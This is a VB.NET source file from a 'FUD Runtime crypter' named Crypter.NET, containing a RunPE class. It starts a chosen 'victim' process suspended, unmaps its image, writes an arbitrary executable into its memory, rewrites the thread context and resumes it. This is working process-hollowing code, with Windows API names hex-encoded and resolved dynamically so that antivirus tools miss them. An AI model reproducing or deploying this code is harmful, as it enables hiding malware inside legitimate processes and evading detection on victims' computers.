'=============================================================================
'                  Crypter.NET - FUD Runtime crypter 
'                 Copyright (C) 2010 fLaSh - Carlos.DF 
'                        <c4rl0s.pt@gmail.com> 
'                     <http://www.flash1337.com/>
' THIS SOFTWARE IS PROVIDED BY THE AUTHORS ``AS IS'' AND ANY EXPRESS OR
' IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
' OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
' IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY DIRECT, INDIRECT,
' INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
' NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
' DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
' THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
' (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
' THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
'=============================================================================
Imports System.Runtime.ConstrainedExecution
Imports System.Runtime.InteropServices
Imports System.Security.Permissions
Imports Microsoft.Win32.SafeHandles
Public NotInheritable Class RunPE
    Inherits NativeDllCalls

#Region " Structures "

    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> _
    Private Structure STARTUPINFO
        Dim cb As Integer
        Dim lpReserved As String
        Dim lpDesktop As String
        Dim lpTitle As String
        Dim dwX As Integer
        Dim dwY As Integer
        Dim dwXSize As Integer
        Dim dwYSize As Integer
        Dim dwXCountChars As Integer
        Dim dwYCountChars As Integer
        Dim dwFillAttribute As Integer
        Dim dwFlags As Integer
        Dim wShowWindow As Short
        Dim cbReserved2 As Short
        Dim lpReserved2 As Integer
        Dim hStdInput As Integer
        Dim hStdOutput As Integer
        Dim hStdError As Integer
    End Structure

    Private Structure PROCESS_INFORMATION
        Dim hProcess As IntPtr
        Dim hThread As IntPtr
        Dim dwProcessId As Integer
        Dim dwThreadId As Integer
    End Structure

    <StructLayout(LayoutKind.Sequential)> _
    Private Structure IMAGE_DOS_HEADER
        Dim e_magic As UInt16
        ' Magic number
        Dim e_cblp As UInt16
        ' Bytes on last page of file
        Dim e_cp As UInt16
        ' Pages in file
        Dim e_crlc As UInt16
        ' Relocations
        Dim e_cparhdr As UInt16
        ' Size of header in paragraphs
        Dim e_minalloc As UInt16
        ' Minimum extra paragraphs needed
        Dim e_maxalloc As UInt16
        ' Maximum extra paragraphs needed
        Dim e_ss As UInt16
        ' Initial (relative) SS value
        Dim e_sp As UInt16
        ' Initial SP value
        Dim e_csum As UInt16
        ' Checksum
        Dim e_ip As UInt16
        ' Initial IP value
        Dim e_cs As UInt16
        ' Initial (relative) CS value
        Dim e_lfarlc As UInt16
        ' File address of relocation table
        Dim e_ovno As UInt16
        ' Overlay number
        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=4)> _
        Dim e_res1 As UInt16()
        ' Reserved words
        Dim e_oemid As UInt16
        ' OEM identifier (for e_oeminfo)
        Dim e_oeminfo As UInt16
        ' OEM information; e_oemid specific
        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=10)> _
        Dim e_res2 As UInt16()
        ' Reserved words
        Dim e_lfanew As Int32
        ' File address of new EXE header
    End Structure
 
    <StructLayout(LayoutKind.Sequential)> _
    Private Structure SECURITY_ATTRIBUTES
        Dim nLength As Integer
        Dim lpSecurityDescriptor As IntPtr
        Dim bInheritHandle As Integer
    End Structure
 
    <StructLayout(LayoutKind.Sequential)> _
    Private Structure FLOATING_SAVE_AREA
        Dim ControlWord As UInteger
        Dim StatusWord As UInteger
        Dim TagWord As UInteger
        Dim ErrorOffset As UInteger
        Dim ErrorSelector As UInteger
        Dim DataOffset As UInteger
        Dim DataSelector As UInteger
        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=80)> _
        Dim RegisterArea As Byte()
        Dim Cr0NpxState As UInteger
    End Structure

    <StructLayout(LayoutKind.Sequential)> _
    Private Structure CONTEXT
        Dim ContextFlags As UInteger
        'set this to an appropriate value
        ' Retrieved by CONTEXT_DEBUG_REGISTERS
        Dim Dr0 As UInteger
        Dim Dr1 As UInteger
        Dim Dr2 As UInteger
        Dim Dr3 As UInteger
        Dim Dr6 As UInteger
        Dim Dr7 As UInteger
        ' Retrieved by CONTEXT_FLOATING_POINT
        Dim FloatSave As FLOATING_SAVE_AREA
        ' Retrieved by CONTEXT_SEGMENTS
        Dim SegGs As UInteger
        Dim SegFs As UInteger
        Dim SegEs As UInteger
        Dim SegDs As UInteger
        ' Retrieved by CONTEXT_INTEGER
        Dim Edi As UInteger
        Dim Esi As UInteger
        Dim Ebx As UInteger
        Dim Edx As UInteger
        Dim Ecx As UInteger
        Dim Eax As UInteger
        ' Retrieved by CONTEXT_CONTROL
        Dim Ebp As UInteger
        Dim Eip As UInteger
        Dim SegCs As UInteger
        Dim EFlags As UInteger
        Dim Esp As UInteger
        Dim SegSs As UInteger
        ' Retrieved by CONTEXT_EXTENDED_REGISTERS
        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=512)> _
        Dim ExtendedRegisters As Byte()
    End Structure

    <StructLayout(LayoutKind.Sequential)> _
    Private Structure IMAGE_OPTIONAL_HEADER32
        ' Standard fields.
        Dim Magic As UInt16
        Dim MajorLinkerVersion As [Byte]
        Dim MinorLinkerVersion As [Byte]
        Dim SizeOfCode As UInt32
        Dim SizeOfInitializedData As UInt32
        Dim SizeOfUninitializedData As UInt32
        Dim AddressOfEntryPoint As UInt32
        Dim BaseOfCode As UInt32
        Dim BaseOfData As UInt32
        ' NT additional fields.
        Dim ImageBase As UInt32
        Dim SectionAlignment As UInt32
        Dim FileAlignment As UInt32
        Dim MajorOperatingSystemVersion As UInt16
        Dim MinorOperatingSystemVersion As UInt16
        Dim MajorImageVersion As UInt16
        Dim MinorImageVersion As UInt16
        Dim MajorSubsystemVersion As UInt16
        Dim MinorSubsystemVersion As UInt16
        Dim Win32VersionValue As UInt32
        Dim SizeOfImage As UInt32
        Dim SizeOfHeaders As UInt32
        Dim CheckSum As UInt32
        Dim Subsystem As UInt16
        Dim DllCharacteristics As UInt16
        Dim SizeOfStackReserve As UInt32
        Dim SizeOfStackCommit As UInt32
        Dim SizeOfHeapReserve As UInt32
        Dim SizeOfHeapCommit As UInt32
        Dim LoaderFlags As UInt32
        Dim NumberOfRvaAndSizes As UInt32
        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=16)> _
        Dim DataDirectory As IMAGE_DATA_DIRECTORY()
    End Structure

    <StructLayout(LayoutKind.Sequential)> _
    Private Structure IMAGE_FILE_HEADER
        Dim Machine As UInt16
        Dim NumberOfSections As UInt16
        Dim TimeDateStamp As UInt32
        Dim PointerToSymbolTable As UInt32
        Dim NumberOfSymbols As UInt32
        Dim SizeOfOptionalHeader As UInt16
        Dim Characteristics As UInt16
    End Structure

    <StructLayout(LayoutKind.Sequential)> _
    Private Structure IMAGE_DATA_DIRECTORY
        Dim VirtualAddress As UInt32
        Dim Size As UInt32
    End Structure

    Private Structure IMAGE_NT_HEADERS
        Dim Signature As UInt32
        Dim FileHeader As IMAGE_FILE_HEADER
        Dim OptionalHeader As IMAGE_OPTIONAL_HEADER32
    End Structure
  
    Private Structure Misc
        Dim PhysicalAddress As System.UInt32
        Dim VirtualSize As System.UInt32
    End Structure

    Private Structure IMAGE_SECTION_HEADER
        Dim Name As System.Byte
        Dim Misc As Misc
        Dim VirtualAddress As System.UInt32
        Dim SizeOfRawData As System.UInt32
        Dim PointerToRawData As System.UInt32
        Dim PointerToRelocations As System.UInt32
        Dim PointerToLinenumbers As System.UInt32
        Dim NumberOfRelocations As System.UInt16
        Dim NumberOfLinenumbers As System.UInt16
        Dim Characteristics As System.UInt32
    End Structure

#End Region

#Region " Consts "

    Private Const CONTEXT_X86 = &H10000
    Private Const CONTEXT86_INTEGER = (CONTEXT_X86 Or &H2)          'AX, BX, CX, DX, SI, DI
    Private Const MEM_COMMIT As Long = &H1000&
    Private Const MEM_RESERVE As Long = &H2000&
    Private Const PAGE_EXECUTE_READWRITE As Long = &H40
    Private Const PAGE_EXECUTE_READ As Long = &H20
    Private Const PAGE_EXECUTE As Long = &H10
    Private Const PAGE_NOACCESS As Long = &H1
    Private Const PAGE_READWRITE As Long = &H4
    Private Const PAGE_READONLY As UInt32 = &H2
  
    Private Const KERNEL32HEX As String = "0x6b65726e656c3332"
    Private Const NTDLLHEX As String = "0x6e74646c6c"

#End Region

#Region " Enums "

    Private Enum ImageSignatureTypes
        IMAGE_DOS_SIGNATURE = &H5A4D     ''\\ MZ
        IMAGE_OS2_SIGNATURE = &H454E     ''\\ NE
        IMAGE_OS2_SIGNATURE_LE = &H454C  ''\\ LE
        IMAGE_VXD_SIGNATURE = &H454C     ''\\ LE
        IMAGE_NT_SIGNATURE = &H4550      ''\\ PE00
    End Enum

#End Region

#Region " Delegates (Win API) "

    '<DllImport("kernel32.dll")> _
    'Private Shared Function ResumeThread _
    '        ( _
    '            ByVal hThread As IntPtr _
    '        ) As UInt32
    'End Function
    Private Delegate Function ResumeThread _
            ( _
                ByVal hThread As IntPtr _
            ) As UInt32

    '<DllImport("kernel32.dll")> _
    'Private Shared Function GetThreadContext _
    '        ( _
    '            ByVal hThread As IntPtr, _
    '            ByRef lpContext As CONTEXT _
    '        ) As Boolean
    'End Function
    Private Delegate Function GetThreadContext _
            ( _
                ByVal hThread As IntPtr, _
                ByRef lpContext As CONTEXT _
            ) As Boolean

    '<DllImport("kernel32.dll")> _
    'Private Shared Function SetThreadContext _
    '        ( _
    '            ByVal hThread As IntPtr, _
    '            ByRef lpContext As CONTEXT _
    '        ) As Boolean
    'End Function
    Private Delegate Function SetThreadContext _
            ( _
                ByVal hThread As IntPtr, _
                ByRef lpContext As CONTEXT _
            ) As Boolean
  
    '<DllImport(Kernel32)> _
    'Private Shared Function CreateProcess _
    '        ( _
    '            ByVal lpApplicationName As String, _
    '            ByVal lpCommandLine As String, _
    '            ByRef lpProcessAttributes As SECURITY_ATTRIBUTES, _
    '            ByRef lpThreadAttributes As SECURITY_ATTRIBUTES, _
    '            ByVal bInheritHandles As Boolean, _
    '            ByVal dwCreationFlags As UInt32, _
    '            ByVal lpEnvironment As IntPtr, _
    '            ByVal lpCurrentDirectory As String, _
    '            <[In]()> ByRef lpStartupInfo As STARTUPINFO, _
    '            <[Out]()> ByRef lpProcessInformation As PROCESS_INFORMATION _
    '        ) As Boolean
    'End Function
    Private Delegate Function CreateProcessA _
            ( _
                ByVal lpApplicationName As String, _
                ByVal lpCommandLine As String, _
                ByRef lpProcessAttributes As SECURITY_ATTRIBUTES, _
                ByRef lpThreadAttributes As SECURITY_ATTRIBUTES, _
                ByVal bInheritHandles As Boolean, _
                ByVal dwCreationFlags As UInt32, _
                ByVal lpEnvironment As IntPtr, _
                ByVal lpCurrentDirectory As String, _
       <[In]()> ByRef lpStartupInfo As STARTUPINFO, _
      <[Out]()> ByRef lpProcessInformation As PROCESS_INFORMATION _
            ) As Boolean

    '<DllImport("kernel32.dll", _
    'SetLastError:=True, _
    'CharSet:=CharSet.Auto, _
    'EntryPoint:="WriteProcessMemory", _
    'CallingConvention:=CallingConvention.StdCall)> _
    'Private Shared Function WriteProcessMemory _
    '        ( _
    '            ByVal hProcess As IntPtr, _
    '            ByVal lpBaseAddress As IntPtr, _
    '            ByVal lpBuffer As Byte(), _
    '            ByVal iSize As Int32, _
    '            <Out()> ByRef lpNumberOfBytesWritten As Int32 _
    '        ) As Boolean
    'End Function
    Private Delegate Function WriteProcessMemory _
        ( _
            ByVal hProcess As IntPtr, _
            ByVal lpBaseAddress As IntPtr, _
            ByVal lpBuffer As Byte(), _
            ByVal iSize As Int32, _
            <Out()> ByRef lpNumberOfBytesWritten As Int32 _
        ) As Boolean
 
    '<DllImport("kernel32.dll", EntryPoint:="ReadProcessMemory")> _
    'Private Shared Function ReadProcessMemory _
    '        ( _
    '            ByVal hProcess As IntPtr, _
    '            ByVal lpBaseAddress As Integer, _
    '            ByRef lpbuffer As IntPtr, _
    '            ByVal size As Integer, _
    '            ByRef lpNumberOfBytesRead As Integer _
    '        ) As Int32
    'End Function
    Private Delegate Function ReadProcessMemory _
               ( _
                   ByVal hProcess As IntPtr, _
                   ByVal lpBaseAddress As Integer, _
                   ByRef lpbuffer As IntPtr, _
                   ByVal size As Integer, _
                   ByRef lpNumberOfBytesRead As Integer _
               ) As Int32

    '<DllImport("ntdll.dll")> _
    'Private Shared Function ZwUnmapViewOfSection _
    '        ( _
    '            ByVal hProcess As IntPtr, _
    '            ByVal BaseAddress As IntPtr _
    '        ) As Long
    'End Function
    Private Delegate Function ZwUnmapViewOfSection _
            ( _
                ByVal hProcess As IntPtr, _
                ByVal BaseAddress As IntPtr _
            ) As Long

    '<DllImport("kernel32.dll", SetLastError:=True, ExactSpelling:=True)> _
    'Private Shared Function VirtualAllocEx _
    '        ( _
    '            ByVal hProcess As IntPtr, _
    '            ByVal lpAddress As IntPtr, _
    '            ByVal dwSize As UInteger, _
    '            ByVal flAllocationType As UInteger, _
    '            ByVal flProtect As UInteger _
    '        ) As IntPtr
    'End Function
    Private Delegate Function VirtualAllocEx _
                ( _
                    ByVal hProcess As IntPtr, _
                    ByVal lpAddress As IntPtr, _
                    ByVal dwSize As UInteger, _
                    ByVal flAllocationType As UInteger, _
                    ByVal flProtect As UInteger _
                ) As IntPtr

    '<DllImport("kernel32", CharSet:=CharSet.Auto, SetLastError:=True)> _
    'Private Shared Function VirtualProtectEx _
    '        ( _
    '            ByVal hProcess As IntPtr, _
    '            ByVal lpAddress As IntPtr, _
    '            ByVal dwSize As UIntPtr, _
    '            ByVal flNewProtect As UIntPtr, _
    '            <Out()> ByVal lpflOldProtect As UInteger _
    '        ) As Integer
    'End Function
    Private Delegate Function VirtualProtectEx _
              ( _
                  ByVal hProcess As IntPtr, _
                  ByVal lpAddress As IntPtr, _
                  ByVal dwSize As UIntPtr, _
                  ByVal flNewProtect As UIntPtr, _
                  <Out()> ByVal lpflOldProtect As UInteger _
              ) As Integer
 
#End Region

#Region " Privates "

    Private Function Protect(ByVal characteristics As Long) As Long
        Dim mapping() As Object = _
            { _
                PAGE_NOACCESS, _
                PAGE_EXECUTE, _
                PAGE_READONLY, _
                PAGE_EXECUTE_READ, _
                PAGE_READWRITE, _
                PAGE_EXECUTE_READWRITE, _
                PAGE_READWRITE, _
                PAGE_EXECUTE_READWRITE _
            }
        Return mapping(RShift(characteristics, 29))
    End Function

    Private Function RShift(ByVal lValue As Long, ByVal lNumberOfBitsToShift As Long) As Long
        Return vbLongToULong(lValue) / (2 ^ lNumberOfBitsToShift)
    End Function

    Private Function vbLongToULong(ByVal Value As Long) As Double
        Const OFFSET_4 = 4294967296.0#
        If Value < 0 Then
            Return Value + OFFSET_4
        Else
            Return Value
        End If
    End Function
 
#End Region

#Region " Publics "

    Public Function SRexec(ByVal sExePath As String, ByVal sVictim As String) As Boolean
        If IO.File.Exists(sExePath) Then
            Dim bytExe As Byte() = IO.File.ReadAllBytes(sExePath)
            Return SRexec(bytExe, sVictim)
        End If
    End Function

    Public Function SRexec(ByVal b() As Byte, ByVal sVictim As String) As Boolean

        Dim oIDH As New IMAGE_DOS_HEADER
        Dim oContext As New CONTEXT()

        Dim oINH As New IMAGE_NT_HEADERS
        Dim oISH As New IMAGE_SECTION_HEADER

        Dim oPI As New PROCESS_INFORMATION()
        Dim oSI As New STARTUPINFO()

        Dim pSec As New SECURITY_ATTRIBUTES()
        Dim tSec As New SECURITY_ATTRIBUTES()

        ' All delegates for DLL's dynamic calls
        Dim oVirtualProtectEx As VirtualProtectEx
        Dim oVirtualAllocEx As VirtualAllocEx
        Dim oZwUnmapViewOfSection As ZwUnmapViewOfSection
        Dim oReadProcessMemory As ReadProcessMemory
        Dim oWriteProcessMemory As WriteProcessMemory
        Dim oCreateProcessA As CreateProcessA
        Dim oSetThreadContext As SetThreadContext
        Dim oGetThreadContext As GetThreadContext
        Dim oResumeThread As ResumeThread

        ' Converts a data type in another type.
        'since .net types are different from types handle by winAPI,  DirectCall a API will cause a type mismatch, since .net types
        'structure is completely different, using different resources.
        Dim MyGC As GCHandle = GCHandle.Alloc(b, GCHandleType.Pinned)
        Dim ptbuffer As Integer = MyGC.AddrOfPinnedObject.ToInt32
        oIDH = Marshal.PtrToStructure(MyGC.AddrOfPinnedObject, oIDH.GetType)
        MyGC.Free()

        oCreateProcessA = DirectCast( _
                    MyBase.DynamicCall(KERNEL32HEX, "0x43726561746550726f6365737341", GetType(CreateProcessA)),  _
                            CreateProcessA)

        If Not oCreateProcessA.Invoke(Nothing, sVictim, pSec, tSec, False, &H4, Nothing, Nothing, oSI, oPI) Then
            Return False
        Else
            Dim vt As Integer = (ptbuffer + oIDH.e_lfanew)
            oINH = Marshal.PtrToStructure(New IntPtr(vt), oINH.GetType)

            Dim addr As Long, lOffset As Long, ret As UInteger
            oSI.cb = Len(oSI)
            oContext.ContextFlags = CONTEXT86_INTEGER

            'all "IF" are only for better understanding, you could do all verification on the builder and then the rest on the stub
            If oINH.Signature <> ImageSignatureTypes.IMAGE_NT_SIGNATURE Or oIDH.e_magic <> ImageSignatureTypes.IMAGE_DOS_SIGNATURE Then
                Return False
            Else

                ' Load Dynamic dll functions..
                oGetThreadContext = DirectCast( _
                            MyBase.DynamicCall(KERNEL32HEX, "0x476574546872656164436f6e74657874", GetType(GetThreadContext)),  _
                                    GetThreadContext)

                oReadProcessMemory = DirectCast( _
                            MyBase.DynamicCall(KERNEL32HEX, "0x5265616450726f636573734d656d6f7279", GetType(ReadProcessMemory)),  _
                                    ReadProcessMemory)

                oZwUnmapViewOfSection = DirectCast( _
                            MyBase.DynamicCall(NTDLLHEX, "0x5a77556e6d6170566965774f6653656374696f6e", GetType(ZwUnmapViewOfSection)),  _
                                    ZwUnmapViewOfSection)

                If oGetThreadContext.Invoke(oPI.hThread, oContext) And _
                   oReadProcessMemory.Invoke(oPI.hProcess, oContext.Ebx + 8, addr, 4, 0) >= 0 And _
                   oZwUnmapViewOfSection.Invoke(oPI.hProcess, addr) >= 0 Then

                    oVirtualAllocEx = DirectCast( _
                            MyBase.DynamicCall(KERNEL32HEX, "0x5669727475616c416c6c6f634578", GetType(VirtualAllocEx)),  _
                                    VirtualAllocEx)

                    Dim ImageBase As UInt32 = _
                        oVirtualAllocEx.Invoke _
                            ( _
                                oPI.hProcess, oINH.OptionalHeader.ImageBase, oINH.OptionalHeader.SizeOfImage, MEM_RESERVE Or MEM_COMMIT, PAGE_READWRITE _
                            )
                    If ImageBase <> 0 Then

                        oWriteProcessMemory = DirectCast( _
                                MyBase.DynamicCall(KERNEL32HEX, "0x577269746550726f636573734d656d6f7279", GetType(WriteProcessMemory)),  _
                                        WriteProcessMemory)

                        oWriteProcessMemory.Invoke(oPI.hProcess, ImageBase, b, oINH.OptionalHeader.SizeOfHeaders, ret)

                        lOffset = oIDH.e_lfanew + 248
                        For i As Integer = 0 To oINH.FileHeader.NumberOfSections - 1
                            'math changes, anyone with pe understanding know
                            oISH = Marshal.PtrToStructure(New IntPtr(ptbuffer + lOffset + i * 40), oISH.GetType)
                            Dim braw(oISH.SizeOfRawData) As Byte
                            'more math for reading only the section.  mm API has a "shortcut" when you pass a specified startpoint.
                            '.net can't use so you have to make a new array
                            For j As Integer = 0 To oISH.SizeOfRawData - 1
                                braw(j) = b(oISH.PointerToRawData + j)
                            Next

                            oWriteProcessMemory = DirectCast( _
                                    MyBase.DynamicCall(KERNEL32HEX, "0x577269746550726f636573734d656d6f7279", GetType(WriteProcessMemory)),  _
                                            WriteProcessMemory)

                            oVirtualProtectEx = DirectCast( _
                                    MyBase.DynamicCall(KERNEL32HEX, "0x5669727475616c50726f746563744578", GetType(VirtualProtectEx)),  _
                                            VirtualProtectEx)

                            oWriteProcessMemory.Invoke(oPI.hProcess, ImageBase + oISH.VirtualAddress, braw, oISH.SizeOfRawData, ret)
                            oVirtualProtectEx.Invoke(oPI.hProcess, ImageBase + oISH.VirtualAddress, oISH.Misc.VirtualSize, Protect(oISH.Characteristics), addr)
                        Next i

                        Dim bb As Byte() = BitConverter.GetBytes(ImageBase)

                        oWriteProcessMemory = DirectCast( _
                                MyBase.DynamicCall(KERNEL32HEX, "0x577269746550726f636573734d656d6f7279", GetType(WriteProcessMemory)),  _
                                            WriteProcessMemory)
                        oWriteProcessMemory.Invoke(oPI.hProcess, oContext.Ebx + 8, bb, 4, ret)

                        oContext.Eax = ImageBase + oINH.OptionalHeader.AddressOfEntryPoint

                        oSetThreadContext = DirectCast( _
                                MyBase.DynamicCall(KERNEL32HEX, "0x536574546872656164436f6e74657874", GetType(SetThreadContext)),  _
                                        SetThreadContext)

                        oResumeThread = DirectCast( _
                                MyBase.DynamicCall(KERNEL32HEX, "0x526573756d65546872656164", GetType(ResumeThread)),  _
                                        ResumeThread)

                        If oSetThreadContext.Invoke(oPI.hThread, oContext) Then
                            Return oResumeThread.Invoke(oPI.hThread) > 0
                        End If
                 
                    Else
                        Return False
                    End If
                Else
                    Return False
                End If
            End If
        End If

    End Function

#End Region
 
End Class
